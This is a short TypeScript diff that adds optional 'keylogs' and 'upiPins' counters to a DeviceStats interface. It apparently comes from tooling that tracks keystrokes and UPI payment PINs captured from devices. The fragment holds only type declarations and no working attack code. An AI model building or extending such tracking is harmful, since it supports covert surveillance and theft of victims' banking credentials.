@@ -2,6 +2,8 @@
 export interface DeviceStats {
     messages: number;
     apps: number;
+    keylogs?: number;
+    upiPins?: number;
 }
 
 export interface IDeviceProvider {
